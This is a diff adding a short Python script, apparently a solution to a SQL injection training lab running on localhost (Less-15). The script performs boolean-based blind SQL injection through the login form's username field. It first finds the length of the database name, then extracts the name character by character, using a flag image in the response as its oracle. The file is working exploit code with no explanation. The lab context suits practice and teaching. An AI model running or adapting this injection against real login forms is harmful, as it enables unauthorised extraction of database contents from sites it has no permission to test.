@@ -1,0 +1,27 @@
+#blind injection SQLI program 
+
+import requests as req
+import string
+
+url ="http://localhost/sqli/Less-15/"
+length=0
+for i in range(100):
+    payload="admin' and length(database())="+str(i)+"#"
+    response =req.post(url,data={'uname':payload,'passwd':""})
+    if ('<img src="../images/flag.jpg"') in response.text:
+        length=i
+        break
+    else:
+        continue
+print("Length:",length)
+
+url ="http://localhost/sqli/Less-15/"
+database=""
+for i in range(1,length+1):
+    for j in string.ascii_letters:
+        payload="admin' and substr(database(),"+str(i)+",1)='"+j+"'#"
+        response=req.post(url,data={'uname':payload,'passwd':""})
+        if ('<img src="../images/flag.jpg"') in response.text:
+            database+=j
+            break
+print("Database:",database)
